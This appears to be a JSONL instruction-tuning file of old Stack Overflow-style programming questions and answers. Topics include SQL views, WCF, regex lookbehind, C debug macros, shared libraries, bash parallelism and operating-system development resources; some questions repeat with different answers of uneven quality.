{"instruction": "I once worked with an architect who banned the use of SQL views. His main reason was that views made it too easy for a thoughtless coder to needlessly involve joined tables which, if that coder tried harder, could be avoided altogether.  Implicitly he was encouraging code reuse via copy-and-paste instead of encapsulation in views.\nThe database had nearly 600 tables and was highly normalised, so most of the useful SQL was necessarily verbose.\nSeveral years later I can see at least one bad outcome from the ban - we have many hundreds of dense, lengthy stored procs that verge on unmaintainable.\nIn hindsight I would say it was a bad decision, but what are your experiences with SQL views?  Have you found them bad for performance? Any other thoughts on when they are or are not appropriate?", "output": "Let's see if I can come up with a lame analogy ...\n\"I don't need a phillips screwdriver.  I carry a flat head and a grinder!\"\nDismissing views out of hand will cause pain long term.  For one, it's easier to debug and modify a single view definition than it is to ship modified code."}
{"instruction": "I need to take a web page and extract the address information from the page. Some are easier than others. I'm looking for a firefox plugin, windows app, or VB.NET code that will help me get this done.\nIdeally I would like to have a web page on our admin (ASP.NET/VB.NET) where you enter a URL and it scraps the page and returns a Dataset that I can put in a Grid.", "output": "Aza Raskin has talked about recognising when selected text is an address in his Firefox Proposal: A Better New Tab Screen. No code yet, but I mention it as there may be code in firefox to do this in the future.\nAlternatively, you could look at using the map command in Ubiquity, although you'd have to select the addresses yourself."}
{"instruction": "I am looking for a powerful meta-language to describa behaviour for an application i intend to use in offline mode (google-gears + javascript) and server side sqlite + (php/ruby/java etc) and looking for a good format to describe the model's behaviour which can be easily converted to the target languages.\nAm I completely off track, and there is a much better way?", "output": "Maybe you should consider using Script#?"}
{"instruction": "I'd like to take some time to learn more about dynamic languages built on top of the DLR and I'm not sure which language would be better to learn.\nHaving limited time, I really only have time to look learn one of them.\nAny opinions on which of the two (Iron Ruby or Iron Python) would be more useful in the long run?", "output": "I would go for IronPython at the moment since there are plenty of books/information around for it (IronPython In Action is just getting finished up).\nI would personally learn IronRuby because I prefer the way Ruby works over Python and since it's one of the same then choose which language you prefer."}
{"instruction": "I'd like to take some time to learn more about dynamic languages built on top of the DLR and I'm not sure which language would be better to learn.\nHaving limited time, I really only have time to look learn one of them.\nAny opinions on which of the two (Iron Ruby or Iron Python) would be more useful in the long run?", "output": "Whichever you choose, take a look at IronEditor -- it's great for playing around. I'm currently using it to try and pick up those languages myself..."}
{"instruction": "I'd like to take some time to learn more about dynamic languages built on top of the DLR and I'm not sure which language would be better to learn.\nHaving limited time, I really only have time to look learn one of them.\nAny opinions on which of the two (Iron Ruby or Iron Python) would be more useful in the long run?", "output": "Without getting into the relative merits of the languages (which would be an entire pissing contest in itself), IronPython (stable 1.1.1, beta 2.0) is further along in development than IronRuby (alpha)"}
{"instruction": "I am looking for a powerful meta-language to describa behaviour for an application i intend to use in offline mode (google-gears + javascript) and server side sqlite + (php/ruby/java etc) and looking for a good format to describe the model's behaviour which can be easily converted to the target languages.\nAm I completely off track, and there is a much better way?", "output": "Have you looked at Google Web Toolkit?  GWT allows you to write server side Java objects which get translated into Javascript for you.  This allows you to not deal with the browser quirks at all.\nI'm not sure how well integrated the Gears and GWT projects are, however.  If it isn't integrated yet, I'm sure it will be in fairly short order.\nEdit:  This is probably more of an alternate way of doing what you're looking for, rather than a suggestion for a meta language."}
{"instruction": "I'd like to take some time to learn more about dynamic languages built on top of the DLR and I'm not sure which language would be better to learn.\nHaving limited time, I really only have time to look learn one of them.\nAny opinions on which of the two (Iron Ruby or Iron Python) would be more useful in the long run?", "output": "As other said, IronPython is more stable and mature, and you can find more samples and lots of regular Python code that you will be able to try out.\nIronRuby is great but beware: to try it you need to get the code right from the SVN and compile it by yourself. Or you can download the Dynamic Silverlight SDK and get it that way, but you'll have to spend sometime learning this environment also."}
{"instruction": "I'm almost certain I know the answer to this question, but I'm hoping there's something I've overlooked.\nCertain applications seem to have the Vista Aero look and feel to their caption bars and buttons even when running on Windows XP. (Google Chrome and  Windows Live Photo Gallery come to mind as examples.)  I know that one way to accomplish this from WinForms would be to create a borderless form and draw the caption bar/buttons yourself, then overriding WndProc to make sure moving, resizing, and button clicks do what they're supposed to do (I'm not clear on the specifics but could probably pull it off given a day to read documentation.)  I'm curious if there's a different, easier way that I'm overlooking.  Perhaps some API calls or window styles I've overlooked?\nI believe Google has answered it for me by using the roll-your-own-window approach with Chrome.  I will leave the question open for another day in case someone has new information, but I believe I have answered the question myself.", "output": "Yes. There are simle way, but it'll cost you money. All large custom control vendors have nice wrappers around WM_NCPAINT and company."}
{"instruction": "What is WCF in simple terms?\nIt's hard to distill the meaning from the Wikipedia page.", "output": "WCF is Microsoft's new .NET do-all extensible communications framework meant to replace functionality previously available in DCOM, .NET Remoting and ASMX web services."}
{"instruction": "What tools would you recommend for setting up CI for build and deployment of multiple websites built on DotNetNuke using SVN for source control? \nWe are currently looking at configuring Cruise Control to work with NAnt, NUnit, NCover and Trac as a test case. What other combinations would worth investigating?\nWe have full control of our development environment so using some form of CI is certain here but I would also like to convince our production services team that they can reliably deploy to the system test, uat and even production environments using these tools.", "output": "I would recommend you take a look at NAnt + NUnit ( + NCover) + TeamCity with SVN for your build system. There is actually a very nice article describing this configuration at Pete W's idea book (Sorry, this link doesn't exist anymore!)"}
{"instruction": "What is WCF in simple terms?\nIt's hard to distill the meaning from the Wikipedia page.", "output": "WCF stands for Windows Communication Foundation. It's Microsoft's attempt to sort out and simplify network programming. It provides an easy to use level of abstraction over different communication protocols and transportation methods. It allows you to concentrate more on what you want to implement rather than thinking on how to implement it.  Read Microsoft's WCF FAQ for more info."}
{"instruction": "What is WCF in simple terms?\nIt's hard to distill the meaning from the Wikipedia page.", "output": "WCF allows you to create \"services\" without specifying that it's a Windows service or a Web service, or which protocols are used to communicate with it or how the data is serialized.\nAll those details may be specified externally, either programmatically in a service host or via the config file."}
{"instruction": "I need to take a web page and extract the address information from the page. Some are easier than others. I'm looking for a firefox plugin, windows app, or VB.NET code that will help me get this done.\nIdeally I would like to have a web page on our admin (ASP.NET/VB.NET) where you enter a URL and it scraps the page and returns a Dataset that I can put in a Grid.", "output": "If you know the format of the page (for instance, if they're all like that ashnha.com page) then it's fairly easy to write VB.NET code that does this: \n\nCreate a System.Net.WebRequest and read the response into a string.\nThen create a\nSystem.Text.RegularExpressions.Regex\nand iterate over the collection of\nMatches between that and the string\nyou just retrieved. For each match,\ncreate a new row in a DataTable.\n\nThe tough bit is writing the regex, which is a bit of a black art. See regexlib.com for loads of tools, books etc about regexes.\nIf the HTML format isn't well-defined enough for a regex, then you're probably going to have to rely on some amount of user intervention in order to identify which bits are the addresses..."}
{"instruction": "What is WCF in simple terms?\nIt's hard to distill the meaning from the Wikipedia page.", "output": "WCF - Windows Communication Framework - is Microsoft's framework to make inter-process communication easier. It let's you do this communication through various means, plain old asmx web services, Remoting, MS Message Queuing, and a couple more.\nIt let's you talk with other .NET apps, or non-Microsoft technologies (like J2EE). It's extensible enough to allow for newer stuff, like REST too (I don't think REST is built-in)."}
{"instruction": "I'm almost certain I know the answer to this question, but I'm hoping there's something I've overlooked.\nCertain applications seem to have the Vista Aero look and feel to their caption bars and buttons even when running on Windows XP. (Google Chrome and  Windows Live Photo Gallery come to mind as examples.)  I know that one way to accomplish this from WinForms would be to create a borderless form and draw the caption bar/buttons yourself, then overriding WndProc to make sure moving, resizing, and button clicks do what they're supposed to do (I'm not clear on the specifics but could probably pull it off given a day to read documentation.)  I'm curious if there's a different, easier way that I'm overlooking.  Perhaps some API calls or window styles I've overlooked?\nI believe Google has answered it for me by using the roll-your-own-window approach with Chrome.  I will leave the question open for another day in case someone has new information, but I believe I have answered the question myself.", "output": "Google Chrome uses the Windows Vista SDK to get the glass look on XP. You can download it here:\nhttp://www.microsoft.com/downloads/details.aspx?FamilyID=4377f86d-c913-4b5c-b87e-ef72e5b4e065&displaylang=en\nUsing this, you need to enabled delay loading of the following DLL's to get the Glass Effect in XP:\n\nuxtheme.dll \ndwmapi.dl"}
{"instruction": "I'd like to make a debug logging function with the same parameters as printf.  But one that can be removed by the pre-processor during optimized builds.\nFor example:\nDebug_Print(\"Warning: value %d > 3!\\n\", value);\n\nI've looked at variadic macros but those aren't available on all platforms. gcc supports them, msvc does not.", "output": "Part of the problem with this kind of functionality is that often it requires\nvariadic macros.  These were standardized fairly recently(C99), and lots of\nold C compilers do not support the standard, or have their own special work\naround.\nBelow is a debug header I wrote that has several cool features:\n\nSupports C99 and C89 syntax for debug macros\nEnable/Disable output based on function argument\nOutput to file descriptor(file io)\n\nNote: For some reason I had some slight code formatting problems.\n#ifndef _DEBUG_H_\n#define _DEBUG_H_\n#if HAVE_CONFIG_H\n#include \"config.h\"\n#endif\n\n#include \"stdarg.h\"\n#include \"stdio.h\"\n\n#define ENABLE 1\n#define DISABLE 0\n\nextern FILE* debug_fd;\n\nint debug_file_init(char *file);\nint debug_file_close(void);\n\n#if HAVE_C99\n#define PRINT(x, format, ...) \\\nif ( x ) { \\\nif ( debug_fd != NULL ) { \\\nfprintf(debug_fd, format, ##__VA_ARGS__); \\\n} \\\nelse { \\\nfprintf(stdout, format, ##__VA_ARGS__); \\\n} \\\n}\n#else\nvoid PRINT(int enable, char *fmt, ...);\n#endif\n\n#if _DEBUG\n#if HAVE_C99\n#define DEBUG(x, format, ...) \\\nif ( x ) { \\\nif ( debug_fd != NULL ) { \\\nfprintf(debug_fd, \"%s : %d \" format, __FILE__, __LINE__, ##__VA_ARGS__); \\\n} \\\nelse { \\\nfprintf(stderr, \"%s : %d \" format, __FILE__, __LINE__, ##__VA_ARGS__); \\\n} \\\n}\n\n#define DEBUGPRINT(x, format, ...) \\\nif ( x ) { \\\nif ( debug_fd != NULL ) { \\\nfprintf(debug_fd, format, ##__VA_ARGS__); \\\n} \\\nelse { \\\nfprintf(stderr, format, ##__VA_ARGS__); \\\n} \\\n}\n#else /* HAVE_C99 */\n\nvoid DEBUG(int enable, char *fmt, ...);\nvoid DEBUGPRINT(int enable, char *fmt, ...);\n\n#endif /* HAVE_C99 */\n#else /* _DEBUG */\n#define DEBUG(x, format, ...)\n#define DEBUGPRINT(x, format, ...)\n#endif /* _DEBUG */\n\n#endif /* _DEBUG_H_ */"}
{"instruction": "I am looking for basic examples/tutorials on:\n\nHow to write/compile libraries in C++ (.so files for Linux, .dll files for Windows).\nHow to import and use those libraries in other code.", "output": "The code\nr.cc :\n#include \"t.h\"\n\nint main()\n{\n    f();\n    return 0;\n}\n\nt.h :\nvoid f();\n\nt.cc :\n#include<iostream>\n#include \"t.h\"    \n\nvoid f()\n{\n    std::cout << \"OH HAI.  I'M F.\" << std::endl;\n}\n\nBut how, how, how?!\n~$ g++ -fpic -c t.cc          # get t.o\n~$ g++ -shared -o t.so t.o    # get t.so\n~$ export LD_LIBRARY_PATH=\".\" # make sure t.so is found when dynamically linked\n~$ g++ r.cc t.so              # get an executable\n\nThe export step is not needed if you install the shared library somewhere along the global library path."}
{"instruction": "Lets say I have a loop in bash:\nfor foo in `some-command`\ndo\n   do-something $foo\ndone\n\ndo-something is cpu bound and I have a nice shiny 4 core processor. I'd like to be able to run up to 4 do-something's at once.\nThe naive approach seems to be:\nfor foo in `some-command`\ndo\n   do-something $foo &\ndone\n\nThis will run all do-somethings at once, but there are a couple downsides, mainly that do-something may also have some significant I/O which performing all at once might slow down a bit. The other problem is that this code block returns immediately, so no way to do other work when all the do-somethings are finished.\nHow would you write this loop so there are always X do-somethings running at once?", "output": "The project I work on uses the wait command to control parallel shell (ksh actually) processes.  To address your concerns about IO, on a modern OS, it's possible parallel execution will actually increase efficiency.  If all processes are reading the same blocks on disk, only the first process will have to hit the physical hardware.  The other processes will often be able to retrieve the block from OS's disk cache in memory.  Obviously, reading from memory is several orders of magnitude quicker than reading from disk.  Also, the benefit requires no coding changes."}
{"instruction": "I am looking for basic examples/tutorials on:\n\nHow to write/compile libraries in C++ (.so files for Linux, .dll files for Windows).\nHow to import and use those libraries in other code.", "output": "Two samples I got off Google:\nA Windows DLL\nA Shared Library"}
{"instruction": "I'm using the AutoComplete control from the ASP.NET AJAX Control Toolkit and I'm experiencing an issue where the AutoComplete does not populate when I set the focus to the assigned textbox.  \nI've tried setting the focus in the Page_Load, Page_PreRender, and Page_Init events and the focus is set properly but the AutoComplete does not work.  If I don't set the focus, everything works fine but I'd like to set it so the users don't have that extra click.  \nIs there a special place I need to set the focus or something else I need to do to make this work?  Thanks.", "output": "We had exactly the same problem.  What we had to do is write a script at the bottom of the page that quickly blurs then refocuses to the textbox.  You can have a look at the (terribly hacky) solution here: http://www.drive.com.au \nThe textbox id is  MainSearchBox_SearchTextBox.  Have a look at about line 586 & you can see where I'm wiring up all the events (I'm actually using prototype for this bit.\nBasically on the focus event of the textbox I set a global var called textBoxHasFocus to true and on the blur event I set it to false.  The on the load event of the page I call this script:\nif (textBoxHasFocus) {\n    $get(\"MainSearchBox_SearchTextBox\").blur();\n    $get(\"MainSearchBox_SearchTextBox\").focus();\n}\n\nThis resets the textbox.  It's really dodgy, but it's the only solution I could find"}
{"instruction": "Is there a way using Python's standard library to easily determine (i.e. one function call) the last day of a given month?\nIf the standard library doesn't support that, does the dateutil package support this?", "output": "EDIT: See @Blair Conrad's answer for a cleaner solution\n\n>>> import datetime\n>>> datetime.date (2000, 2, 1) - datetime.timedelta (days = 1)\ndatetime.date(2000, 1, 31)\n>>>"}
{"instruction": "I am looking for a regex that will match a string that starts with one substring and does not end with a certain substring.\nExample:\n// Updated to be correct, thanks @Apocalisp\n^foo.*(?<!bar)$\n\nShould match anything that starts with \"foo\" and doesn't end with \"bar\".  I know about the [^...] syntax, but I can't find anything that will do that for a string instead of single characters.  \nI am specifically trying to do this for Java's regex, but I've run into this before so answers for other regex engines would be great too.  \nThanks to @Kibbee for verifying that this works in C# as well.", "output": "I'm not familiar with Java regex but documentation for the Pattern Class would suggest you could use (?!X) for a non-capturing zero-width negative lookahead (it looks for something that is not X at that postision, without capturing it as a backreference). So you could do:\nfoo.*(?!bar) // not correct\n\nUpdate: Apocalisp's right, you want negative lookbehind. (you're checking that what the .* matches doesn't end with bar)"}
{"instruction": "I'm almost certain I know the answer to this question, but I'm hoping there's something I've overlooked.\nCertain applications seem to have the Vista Aero look and feel to their caption bars and buttons even when running on Windows XP. (Google Chrome and  Windows Live Photo Gallery come to mind as examples.)  I know that one way to accomplish this from WinForms would be to create a borderless form and draw the caption bar/buttons yourself, then overriding WndProc to make sure moving, resizing, and button clicks do what they're supposed to do (I'm not clear on the specifics but could probably pull it off given a day to read documentation.)  I'm curious if there's a different, easier way that I'm overlooking.  Perhaps some API calls or window styles I've overlooked?\nI believe Google has answered it for me by using the roll-your-own-window approach with Chrome.  I will leave the question open for another day in case someone has new information, but I believe I have answered the question myself.", "output": "@Jonathan Holland: Is this something that can be done from .NET?\n\nYes, using DllImport. Here is a good blog post"}
{"instruction": "I am looking for a regex that will match a string that starts with one substring and does not end with a certain substring.\nExample:\n// Updated to be correct, thanks @Apocalisp\n^foo.*(?<!bar)$\n\nShould match anything that starts with \"foo\" and doesn't end with \"bar\".  I know about the [^...] syntax, but I can't find anything that will do that for a string instead of single characters.  \nI am specifically trying to do this for Java's regex, but I've run into this before so answers for other regex engines would be great too.  \nThanks to @Kibbee for verifying that this works in C# as well.", "output": "As other commenters said, you need a negative lookahead. In Java you can use this pattern:\n\"^first_string(?!.?second_string)\\\\z\"\n\n\n^ - ensures that string starts with\nfirst_string\n\\z - ensures that string ends with second_string\n(?!.?second_string) - means that first_string can't be followed by second_string"}
{"instruction": "I am looking for a regex that will match a string that starts with one substring and does not end with a certain substring.\nExample:\n// Updated to be correct, thanks @Apocalisp\n^foo.*(?<!bar)$\n\nShould match anything that starts with \"foo\" and doesn't end with \"bar\".  I know about the [^...] syntax, but I can't find anything that will do that for a string instead of single characters.  \nI am specifically trying to do this for Java's regex, but I've run into this before so answers for other regex engines would be great too.  \nThanks to @Kibbee for verifying that this works in C# as well.", "output": "I think in this case you want negative lookbehind, like so:\nfoo.*(?<!bar)"}
{"instruction": "I am looking for a regex that will match a string that starts with one substring and does not end with a certain substring.\nExample:\n// Updated to be correct, thanks @Apocalisp\n^foo.*(?<!bar)$\n\nShould match anything that starts with \"foo\" and doesn't end with \"bar\".  I know about the [^...] syntax, but I can't find anything that will do that for a string instead of single characters.  \nI am specifically trying to do this for Java's regex, but I've run into this before so answers for other regex engines would be great too.  \nThanks to @Kibbee for verifying that this works in C# as well.", "output": "Verified @Apocalisp's answer using:\nimport java.util.regex.Pattern;\npublic class Test {\n  public static void main(String[] args) {\n    Pattern p = Pattern.compile(\"^foo.*(?<!bar)$\");\n    System.out.println(p.matcher(\"foobar\").matches());\n    System.out.println(p.matcher(\"fooBLAHbar\").matches());\n    System.out.println(p.matcher(\"1foo\").matches());\n    System.out.println(p.matcher(\"fooBLAH-ar\").matches());\n    System.out.println(p.matcher(\"foo\").matches());\n    System.out.println(p.matcher(\"foobaz\").matches());\n  }\n}\n\nThis output the the right answers:\nfalse\nfalse\nfalse\ntrue\ntrue\ntrue"}
{"instruction": "Is there a way using Python's standard library to easily determine (i.e. one function call) the last day of a given month?\nIf the standard library doesn't support that, does the dateutil package support this?", "output": "EDIT: see my other answer. It has a better implementation than this one, which I leave here just in case someone's interested in seeing how one might \"roll your own\" calculator.\n@John Millikin gives a good answer, with the added complication of calculating the first day of the next month.\nThe following isn't particularly elegant, but to figure out the last day of the month that any given date lives in, you could try:\ndef last_day_of_month(date):\n    if date.month == 12:\n        return date.replace(day=31)\n    return date.replace(month=date.month+1, day=1) - datetime.timedelta(days=1)\n\n>>> last_day_of_month(datetime.date(2002, 1, 17))\ndatetime.date(2002, 1, 31)\n>>> last_day_of_month(datetime.date(2002, 12, 9))\ndatetime.date(2002, 12, 31)\n>>> last_day_of_month(datetime.date(2008, 2, 14))\ndatetime.date(2008, 2, 29)"}
{"instruction": "This question is addressed to a degree in this question on LINQ to SQL .dbml best practices, but I am not sure how to add to a question.\nOne of our applications uses LINQ to SQL and we have currently have one .dbml file for the entire database which is becoming difficult to manage.  We are looking at refactoring it a bit into separate files that are more module/functionality specific, but one problem is that many of the high level classes would have to be duplicated in several .dbml files as the associations can't be used across .dbml files (as far as I know), with the additional partial class code as well.\nHas anyone grappled with this problem and what recommendations would you make?", "output": "Past a certain size it probably becomes easier to work with the xml instead of the dbml designer."}
{"instruction": "I need to implement a 4-to-1 function in Veriog.  The input is 4 bits, a number from 0-15.  The output is a single bit, 0 or 1.  Each input gives a different output and the mapping from inputs to outputs is known, but the inputs and outputs themselves are not.  I want vcs to successfully optimizing the code and also have it be as short/neat as possible.  My solution so far:\nwire [3:0] a;\nwire b;\nwire [15:0] c;\n\nassign c = 16'b0100110010111010; //for example but could be any constant\nassign b = c[a];\n\nHaving to declare c is ugly and I don't know if vcs will recognize the K-map there.  Will this work as well as a case statement or an assignment in conjunctive normal form?", "output": "My preference - if it makes sense for your problem - is for a case statement that makes use of enums or `defines. Anything to make code review, maintenance and verification easier."}
{"instruction": "One thing I've always wanted to do is develop my very own operating system (not necessarily fancy like Linux or Windows, but better than a simple boot loader which I've already done).\nI'm having a hard time finding resources/guides that take you past writing a simple \"Hello World\" OS.  \nI know lots of people will probably recommend I look at Linux or BSD; but the code base for systems like that is (presumably) so big that I wouldn't know where to start.\nAny suggestions?\nUpdate: To make it easier for people who land on this post through Google here are some OS development resources:\n\nWriting Your Own Operating System (Thanks Adam)\nLinux From Scratch (Thanks John)\nSharpOS (C# Operating System) (Thanks lomaxx)\nMinix3 and Minix2 (Thanks Mike)\nOS Dev Wiki and Forums (Thanks Steve)\nBonaFide (Thanks Steve)\nBran (Thanks Steve)\nRoll your own toy UNIX-clone OS (Thanks Steve)\nBroken Thorn OS Development Series\n\nOther resources:\nI found a nice resource named MikeOS, \"MikeOS is a learning tool to demonstrate how simple OSes work. It uses 16-bit real mode for BIOS access, so that it doesn't need complex drivers\"\nUpdated 11/14/08 \nI found some resources at Freebyte's Guide to...Free and non-free Operating Systems that links to kits such as OSKit and ExOS library.  These seem super useful in getting started in OS development.\nUpdated 2/23/09\nRic Tokyo recommended nanoos in this question.  Nanoos is an OS written in C++.\nUpdated 3/9/09\nDinah provided some useful Stack Overflow discussion of aspiring OS developers: Roadblocks in creating a custom operating system discusses what pitfalls you might encounter while developing an OS\nand OS Development is a more general discussion.\nUpdated 7/9/09\nLB provided a link to the Pintos Project, an education OS designed for students learning OS development.\nUpdated 7/27/09 (Still going strong!)\nI stumbled upon an online OS course from Berkley featuring 23 lectures.\nTomOS is a fork of MikeOS that includes a little memory manager and mouse support. As MikeOS, it is designed to be an educational project.  It is written in NASM assembler.\nUpdated 8/4/09\nI found the slides and other materials to go along with the online Berkeley lectures listed above. \nUpdated 8/23/09\nAll questions tagged osdev on stackoverflow\nOS/161 is an academic OS written in c that runs on a simulated hardware.  This OS is similar in Nachos.  Thanks Novelocrat!\ntangurena recommends http://en.wikipedia.org/wiki/MicroC/OS-II, an OS designed for embedded systems.  There is a companion book as well.\nLinux Kernel Development by Robert Love is suggested by Anders.  It is a \"widely acclaimed insider's look at the Linux kernel.\"\nUpdated 9/18/2009\nThanks Tim S. Van Haren for telling us about Cosmos, an OS written entirely in c#.\ntgiphil tells us about Managed Operating System Alliance (MOSA) Framework, \"a set of tools, specifications and source code to foster development of managed operating systems based on the Common Intermediate Language.\"\nUpdate 9/24/2009\nSteve found a couple resources for development on windows using Visual Studio, check out BrokenThorn's guide setup with VS 2005 or OSDev's VS Section.\nUpdate 1/20/2012\nA set of tutorials aims to take you through programming a simple UNIX-clone operating system for the x86 architecture.\nJamesM's kernel development tutorials\nUpdated 9/5/2012\nkerneltrap.org is no longer available.  The linux kernel v0.01 is available from kernel.org\nUpdated 12/21/2012\nA basic OS development tutorial designed to be a semester's project. It guides you through to build an OS with basic components. Very good start for beginners. Related paper.  Thanks Srujan!\nUpdated 11/15/2013\nWriting a Simple Operating System From Scratch.  Thanks James Moore!\nUpdated 12/8/2013\nHow to make a computer operating system  Thanks ddtoni!\nUpdated 3/18/2014\nToAruOS an OS built mostly from scratch, including GUI\nUpdated Sept 12 2016\nWriting your own Toy Operating System", "output": "Minix is a lot smaller, and designed for learning purposes, and the book to go with it is a good one too.\nUpdate: I guess Minix 3 is a bit of a different goal, but Minix 2 (and of course the first version) were for teaching purposes."}
{"instruction": "One thing I've always wanted to do is develop my very own operating system (not necessarily fancy like Linux or Windows, but better than a simple boot loader which I've already done).\nI'm having a hard time finding resources/guides that take you past writing a simple \"Hello World\" OS.  \nI know lots of people will probably recommend I look at Linux or BSD; but the code base for systems like that is (presumably) so big that I wouldn't know where to start.\nAny suggestions?\nUpdate: To make it easier for people who land on this post through Google here are some OS development resources:\n\nWriting Your Own Operating System (Thanks Adam)\nLinux From Scratch (Thanks John)\nSharpOS (C# Operating System) (Thanks lomaxx)\nMinix3 and Minix2 (Thanks Mike)\nOS Dev Wiki and Forums (Thanks Steve)\nBonaFide (Thanks Steve)\nBran (Thanks Steve)\nRoll your own toy UNIX-clone OS (Thanks Steve)\nBroken Thorn OS Development Series\n\nOther resources:\nI found a nice resource named MikeOS, \"MikeOS is a learning tool to demonstrate how simple OSes work. It uses 16-bit real mode for BIOS access, so that it doesn't need complex drivers\"\nUpdated 11/14/08 \nI found some resources at Freebyte's Guide to...Free and non-free Operating Systems that links to kits such as OSKit and ExOS library.  These seem super useful in getting started in OS development.\nUpdated 2/23/09\nRic Tokyo recommended nanoos in this question.  Nanoos is an OS written in C++.\nUpdated 3/9/09\nDinah provided some useful Stack Overflow discussion of aspiring OS developers: Roadblocks in creating a custom operating system discusses what pitfalls you might encounter while developing an OS\nand OS Development is a more general discussion.\nUpdated 7/9/09\nLB provided a link to the Pintos Project, an education OS designed for students learning OS development.\nUpdated 7/27/09 (Still going strong!)\nI stumbled upon an online OS course from Berkley featuring 23 lectures.\nTomOS is a fork of MikeOS that includes a little memory manager and mouse support. As MikeOS, it is designed to be an educational project.  It is written in NASM assembler.\nUpdated 8/4/09\nI found the slides and other materials to go along with the online Berkeley lectures listed above. \nUpdated 8/23/09\nAll questions tagged osdev on stackoverflow\nOS/161 is an academic OS written in c that runs on a simulated hardware.  This OS is similar in Nachos.  Thanks Novelocrat!\ntangurena recommends http://en.wikipedia.org/wiki/MicroC/OS-II, an OS designed for embedded systems.  There is a companion book as well.\nLinux Kernel Development by Robert Love is suggested by Anders.  It is a \"widely acclaimed insider's look at the Linux kernel.\"\nUpdated 9/18/2009\nThanks Tim S. Van Haren for telling us about Cosmos, an OS written entirely in c#.\ntgiphil tells us about Managed Operating System Alliance (MOSA) Framework, \"a set of tools, specifications and source code to foster development of managed operating systems based on the Common Intermediate Language.\"\nUpdate 9/24/2009\nSteve found a couple resources for development on windows using Visual Studio, check out BrokenThorn's guide setup with VS 2005 or OSDev's VS Section.\nUpdate 1/20/2012\nA set of tutorials aims to take you through programming a simple UNIX-clone operating system for the x86 architecture.\nJamesM's kernel development tutorials\nUpdated 9/5/2012\nkerneltrap.org is no longer available.  The linux kernel v0.01 is available from kernel.org\nUpdated 12/21/2012\nA basic OS development tutorial designed to be a semester's project. It guides you through to build an OS with basic components. Very good start for beginners. Related paper.  Thanks Srujan!\nUpdated 11/15/2013\nWriting a Simple Operating System From Scratch.  Thanks James Moore!\nUpdated 12/8/2013\nHow to make a computer operating system  Thanks ddtoni!\nUpdated 3/18/2014\nToAruOS an OS built mostly from scratch, including GUI\nUpdated Sept 12 2016\nWriting your own Toy Operating System", "output": "There are good resources for operating system fundamentals in books.  Since there isn't much call to create new OS's from scratch you won't find a ton of hobbyist type information on the internet.\nI recommend the standard text book, \"Modern Operating Systems\" by Tanenbaum.  You may also be able to find \"Operating System Elements\" by Calingaert useful - it's a thin overview of a book which give a rough sketch of what an OS is from a designer's standpoint.\nIf you have any interest in real time systems (and you should at least understand the differences and reasons for real time OS's) then I'd also recommend \"MicroC/OS-II\" by Labrosse.\nEdit:\nCan you specify what you mean by \"more technical\"?  These books give pseudo code implementation details, but are you looking for an example OS, or code snippets for a particular machine/language?"}
{"instruction": "Does anyone know how to setup Mercurial to use p4merge as the merge/diff tool on OS X 10.5?", "output": "I'm guessing there's a CLI tool for p4merge (which I know nothing about).\nI wrote a blog post about using Changes.app, and some other GUI tools with Mercurial: Using Mercurial with GUI Tools.\nBasically, you need to know the calling expectations of the CLI tool that loads up the diff tool.  IE, how to make it load data from a particular file, and how to make it wait for exit.  There should be enough info on the post to give you some ideas."}
{"instruction": "One thing I've always wanted to do is develop my very own operating system (not necessarily fancy like Linux or Windows, but better than a simple boot loader which I've already done).\nI'm having a hard time finding resources/guides that take you past writing a simple \"Hello World\" OS.  \nI know lots of people will probably recommend I look at Linux or BSD; but the code base for systems like that is (presumably) so big that I wouldn't know where to start.\nAny suggestions?\nUpdate: To make it easier for people who land on this post through Google here are some OS development resources:\n\nWriting Your Own Operating System (Thanks Adam)\nLinux From Scratch (Thanks John)\nSharpOS (C# Operating System) (Thanks lomaxx)\nMinix3 and Minix2 (Thanks Mike)\nOS Dev Wiki and Forums (Thanks Steve)\nBonaFide (Thanks Steve)\nBran (Thanks Steve)\nRoll your own toy UNIX-clone OS (Thanks Steve)\nBroken Thorn OS Development Series\n\nOther resources:\nI found a nice resource named MikeOS, \"MikeOS is a learning tool to demonstrate how simple OSes work. It uses 16-bit real mode for BIOS access, so that it doesn't need complex drivers\"\nUpdated 11/14/08 \nI found some resources at Freebyte's Guide to...Free and non-free Operating Systems that links to kits such as OSKit and ExOS library.  These seem super useful in getting started in OS development.\nUpdated 2/23/09\nRic Tokyo recommended nanoos in this question.  Nanoos is an OS written in C++.\nUpdated 3/9/09\nDinah provided some useful Stack Overflow discussion of aspiring OS developers: Roadblocks in creating a custom operating system discusses what pitfalls you might encounter while developing an OS\nand OS Development is a more general discussion.\nUpdated 7/9/09\nLB provided a link to the Pintos Project, an education OS designed for students learning OS development.\nUpdated 7/27/09 (Still going strong!)\nI stumbled upon an online OS course from Berkley featuring 23 lectures.\nTomOS is a fork of MikeOS that includes a little memory manager and mouse support. As MikeOS, it is designed to be an educational project.  It is written in NASM assembler.\nUpdated 8/4/09\nI found the slides and other materials to go along with the online Berkeley lectures listed above. \nUpdated 8/23/09\nAll questions tagged osdev on stackoverflow\nOS/161 is an academic OS written in c that runs on a simulated hardware.  This OS is similar in Nachos.  Thanks Novelocrat!\ntangurena recommends http://en.wikipedia.org/wiki/MicroC/OS-II, an OS designed for embedded systems.  There is a companion book as well.\nLinux Kernel Development by Robert Love is suggested by Anders.  It is a \"widely acclaimed insider's look at the Linux kernel.\"\nUpdated 9/18/2009\nThanks Tim S. Van Haren for telling us about Cosmos, an OS written entirely in c#.\ntgiphil tells us about Managed Operating System Alliance (MOSA) Framework, \"a set of tools, specifications and source code to foster development of managed operating systems based on the Common Intermediate Language.\"\nUpdate 9/24/2009\nSteve found a couple resources for development on windows using Visual Studio, check out BrokenThorn's guide setup with VS 2005 or OSDev's VS Section.\nUpdate 1/20/2012\nA set of tutorials aims to take you through programming a simple UNIX-clone operating system for the x86 architecture.\nJamesM's kernel development tutorials\nUpdated 9/5/2012\nkerneltrap.org is no longer available.  The linux kernel v0.01 is available from kernel.org\nUpdated 12/21/2012\nA basic OS development tutorial designed to be a semester's project. It guides you through to build an OS with basic components. Very good start for beginners. Related paper.  Thanks Srujan!\nUpdated 11/15/2013\nWriting a Simple Operating System From Scratch.  Thanks James Moore!\nUpdated 12/8/2013\nHow to make a computer operating system  Thanks ddtoni!\nUpdated 3/18/2014\nToAruOS an OS built mostly from scratch, including GUI\nUpdated Sept 12 2016\nWriting your own Toy Operating System", "output": "you also might want to take a look at SharpOS which is an operating system that they're writing in c#."}
